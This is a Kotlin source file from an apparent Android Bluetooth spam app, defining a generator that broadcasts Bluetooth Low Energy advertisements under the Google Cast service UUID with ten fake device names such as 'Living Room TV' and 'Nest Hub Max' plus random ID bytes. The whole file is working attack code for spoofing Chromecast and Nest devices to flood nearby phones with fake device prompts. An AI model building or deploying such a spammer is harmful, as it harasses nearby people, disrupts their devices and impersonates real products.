package com.nlespam.generators

import android.os.ParcelUuid
import com.nlespam.models.*
import java.util.UUID
import kotlin.random.Random

class ChromecastSpamGenerator : SpamGenerator {
    override val name = "Chromecast Spam"

    // Chromecast uses service UUID FEA0 (Google Cast)
    private val castServiceUuid = ParcelUuid(UUID.fromString("0000FEA0-0000-1000-8000-00805F9B34FB"))

    val deviceNames = listOf(
        "Living Room TV",
        "Chromecast Ultra",
        "Google Home",
        "Nest Hub Max",
        "Nest Audio",
        "Chromecast HD",
        "Bedroom TV",
        "Office Speaker",
        "Kitchen Display",
        "Google Home Mini",
    )

    override fun generate(): List<AdvertisementSet> = deviceNames.map { deviceName ->
        // Chromecast discovery payload: device capabilities + friendly name encoded
        val capabilities: Byte = 0x06 // Audio + Video
        val nameBytes = deviceName.toByteArray(Charsets.UTF_8)
        val payload = byteArrayOf(
            capabilities,
            nameBytes.size.toByte(),
        ) + nameBytes + Random.nextBytes(4) // + random device ID suffix

        AdvertisementSet(
            title = deviceName,
            target = AdvertisementTarget.GOOGLE,
            type = SpamType.CHROMECAST_SPAM,
            serviceData = ServiceData(castServiceUuid, payload),
            includeDeviceName = true,
        )
    }
}
